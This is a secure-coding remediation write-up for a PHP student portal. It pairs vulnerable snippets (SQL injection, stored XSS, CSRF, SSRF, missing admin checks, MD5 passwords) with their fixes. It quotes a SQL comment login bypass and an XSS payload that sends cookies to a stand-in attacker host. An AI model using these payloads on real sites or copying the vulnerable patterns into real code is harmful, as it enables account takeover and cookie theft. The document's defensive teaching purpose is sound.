# Security Remediation Notes -- Before / After

Each entry: the vulnerable pattern (full file in `legacy/`), the fix
(full file in `public/` or `src/`), and why the fix works.

## 1. SQL Injection -- Login

**Before** (`legacy/login_vulnerable.php`):
```php
$sql = "SELECT * FROM users WHERE email = '$identifier' AND password = '" . md5($password) . "'";
$result = $conn->query($sql);
```
An identifier of `admin@example.test' -- ` comments out the password
check entirely, authenticating as `admin@example.test` with no
password at all.

**After** (`src/Auth.php` + `src/Database.php`):
```php
$stmt = Database::run(
    'SELECT id, matric_no, email, password_hash, full_name, role, is_active
     FROM users WHERE email = ? OR matric_no = ? LIMIT 1',
    [$identifier, $identifier]
);
```
`PDO::ATTR_EMULATE_PREPARES` is disabled, so the driver sends the SQL
text and the bound value in separate protocol messages -- user input
can never change the query's structure, regardless of its content.
Argon2id (`password_hash`/`password_verify`) replaces the unsalted
MD5 comparison.

## 2. SQL Injection -- Admin Search

**Before** (`legacy/admin_search_vulnerable.php`):
```php
$sql = "SELECT * FROM users WHERE full_name LIKE '%$search%' OR matric_no LIKE '%$search%'";
```
**After** (`public/admin/students.php`):
```php
$like = '%' . $search . '%';
$students = Database::run(
    'SELECT id, matric_no, email, full_name, is_active FROM users
     WHERE role = "student" AND (full_name LIKE ? OR matric_no LIKE ? OR email LIKE ?)',
    [$like, $like, $like]
)->fetchAll();
```
The `%` wildcard is applied to the *value*, not the SQL text, so the
bound parameter is always treated as a literal string to match against.

## 3. Stored XSS -- Profile Bio

**Before** (`legacy/profile_vulnerable.php`):
```php
<div class="bio"><?php echo $user['bio']; ?></div>
```
A bio of `<script>document.location='https://attacker.test/c?'+document.cookie</script>`
runs in every visitor's browser, including an admin viewing the
student list.

**After** (`public/dashboard.php` + `src/SecurityHeaders.php`):
```php
<textarea id="bio" name="bio"><?= e($user['bio'] ?? '') ?></textarea>
```
```php
function e(?string $value): string {
    return htmlspecialchars($value ?? '', ENT_QUOTES, 'UTF-8');
}
```
plus a response header `Content-Security-Policy: ... script-src 'self'`
as defence in depth, so even an encoding mistake elsewhere can't
execute an inline `<script>`.

## 4. CSRF -- Course Enrolment / Profile Update

**Before**: forms had no hidden token; a state-changing action could
be triggered by a forged form on any other site, submitted
automatically using the victim's session cookie.

**After** (`src/Csrf.php`, used in `public/courses.php`,
`public/dashboard.php`, `public/upload.php`, `public/url_preview.php`,
`public/admin/courses.php`):
```php
if (!Csrf::verify($_POST['csrf_token'] ?? null)) {
    Logger::log('csrf_rejected', $user['email'], Logger::clientIp(), ['form' => 'course_enrol']);
    $error = 'Your session expired. Please reload the page and try again.';
}
```
The token is per-session, generated with `random_bytes(32)`, compared
with `hash_equals()` (constant-time), and rotated after each successful
use. Paired with `SameSite=Lax` on the session cookie.

## 5. SSRF -- Link Preview

**Before** (`legacy/url_preview_vulnerable.php`):
```php
$content = file_get_contents($_POST['url']); // fetches ANY URL, follows redirects
```
**After** (`src/UrlGuard.php`, used in `public/url_preview.php`):
```php
[$allowed, $reason] = UrlGuard::isAllowed($url, $config['url_preview_allowlist']);
// scheme must be https, host must be on the allowlist,
// resolved IP must not be private/loopback/link-local/metadata
```
```php
curl_setopt_array($ch, [
    CURLOPT_FOLLOWLOCATION => false,
    CURLOPT_PROTOCOLS      => CURLPROTO_HTTPS,
    CURLOPT_TIMEOUT        => 3,
]);
```
The allowlist stops arbitrary destinations; the resolved-IP check
stops an allowlisted-looking hostname that has been re-pointed at an
internal address (DNS rebinding); disabling redirect-following stops
an allowlisted URL from 302-redirecting the request elsewhere.

## 6. Broken Access Control -- Admin Pages

**Before**: the `/admin` link was simply omitted from the nav bar for
non-admin users, with no server-side check on the admin pages
themselves -- any authenticated student could reach
`/admin/index.php` by typing the URL directly.

**After** (`src/Auth.php`, called at the top of every file under
`public/admin/`):
```php
public static function requireAdmin(): array {
    $user = self::requireLogin();
    if ($user['role'] !== 'admin') {
        Logger::log('authorization_denied', $user['email'], Logger::clientIp(), ['required_role' => 'admin']);
        http_response_code(403);
        echo 'Forbidden';
        exit;
    }
    return $user;
}
```

## 7. Weak Authentication Controls

**Before**: unsalted MD5 password hashing, no limit on login attempts,
no session regeneration on login.

**After** (`src/Auth.php`):
- Argon2id hashing (`PASSWORD_ARGON2ID`, tuned memory/time cost).
- Rate limiting: max 5 failed attempts per identifier or IP per
  15-minute window, then a 15-minute account lockout
  (`isRateLimited`, `registerFailureAndMaybeLock`).
- `Session::regenerate()` (`session_regenerate_id(true)`) on every
  successful login, preventing session fixation.
- Secure password reset: single-use, SHA-256-hashed, 30-minute-expiry
  tokens (`password_reset_request.php` / `password_reset_confirm.php`);
  the raw token is never stored, only its hash.
